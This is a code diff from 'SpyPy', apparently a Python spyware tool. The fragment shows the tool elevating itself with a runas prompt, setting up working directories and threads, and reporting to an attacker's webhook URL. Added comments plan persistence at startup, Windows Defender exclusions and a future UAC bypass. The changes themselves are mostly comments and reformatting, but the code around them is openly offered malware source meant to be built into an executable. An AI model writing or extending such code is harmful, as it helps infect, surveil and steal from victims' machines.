@@ -27,13 +27,14 @@ CUSTOM_ERROR_MESSAGE = None  #
 ###############################
 
 
+# TODO Add to startup, windows defender exclusions, etc.
 class SpyPy:
     def __init__(self):
         if not is_admin():
             ctypes.windll.shell32.ShellExecuteW(
                 None, "runas", sys.executable, " ".join(sys.argv), None, 1
-            )
-            os._exit(0) # nice!!!
+            )  # uac bypass in the future maybe
+            os._exit(0)
 
         self.logs_path = os.path.join(tempfile.gettempdir(), SOFTWARE_DIR_NAME)
         self.software_dir = os.path.join(os.path.expanduser("~"), SOFTWARE_DIR_NAME)
@@ -98,7 +99,7 @@ class SpyPy:
                 self.threads.append(thread)
 
     def stop(self):
-        os._exit(0)
+        os._exit(0)  # idk when this will be used
 
     def setup(self):
         if self.is_exe:
@@ -134,7 +135,10 @@ class SpyPy:
                 self.start()
         else:
             send_webhook(WEBHOOK_URL, f"```✅ SpyPy has been executed directly...```")
-            send_webhook(WEBHOOK_URL, f"```This is for debugging purposes only. If you want to use SpyPy, please build it as an executable by running spy-py.bat.```")
+            send_webhook(
+                WEBHOOK_URL,
+                f"```This is for debugging purposes only. If you want to use SpyPy, please build it as an executable by running spy-py.bat.```",
+            )
             if CUSTOM_ERROR_MESSAGE:
                 display_error_message("Error", CUSTOM_ERROR_MESSAGE)
             self.start()
